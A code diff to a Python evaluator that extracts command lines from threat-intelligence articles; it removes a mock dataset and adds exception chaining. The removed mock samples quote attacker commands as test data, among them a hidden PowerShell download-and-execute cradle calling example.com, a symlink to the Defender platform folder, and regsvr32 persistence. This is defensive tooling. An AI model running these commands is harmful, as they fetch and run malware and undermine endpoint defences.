@@ -165,35 +165,6 @@ class CommandlineExtractorEvaluator:
             },
         ]
 
-        # For now, return mock data since we don't have the exact LangFuse API
-        logger.info(f"Using mock data for LangFuse dataset {dataset_name} (API integration pending)")
-
-        return [
-            {
-                "id": "sample_cmdline_1",
-                "input": {
-                    "article_content": 'The attackers used cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0" to create a symbolic link. They also executed powershell -w hidden -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')" to download additional malware.',
-                    "article_title": "Advanced Persistent Threat Campaign Analysis",
-                },
-                "expected_output": {
-                    "cmdline_items": [
-                        'cmd.exe /c mklink /D "C:\\ProgramData\\roming" "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0"',
-                        "powershell -w hidden -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
-                    ]
-                },
-                "metadata": {"source": "mock_data", "difficulty": "medium"},
-            },
-            {
-                "id": "sample_cmdline_2",
-                "input": {
-                    "article_content": 'Security researchers discovered that the malware uses regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll" for persistence. The command was found in the Sysmon logs.',
-                    "article_title": "Malware Analysis Report",
-                },
-                "expected_output": {"cmdline_items": ['regsvr32.exe /S "C:\\ProgramData\\Roning\\goldendays.dll"']},
-                "metadata": {"source": "mock_data", "difficulty": "easy"},
-            },
-        ]
-
     def _load_local_dataset(self, dataset_path: str) -> list[dict[str, Any]]:
         """Load dataset from local JSON file."""
         try:
@@ -602,7 +573,7 @@ def load_single_article(article_input: str) -> list[dict[str, Any]]:
                 return article_data
             raise ValueError("Invalid file format")
         except Exception as e:
-            raise ValueError(f"Could not load article from '{article_input}': {e}")
+            raise ValueError(f"Could not load article from '{article_input}': {e}") from e
 
 
 def main():
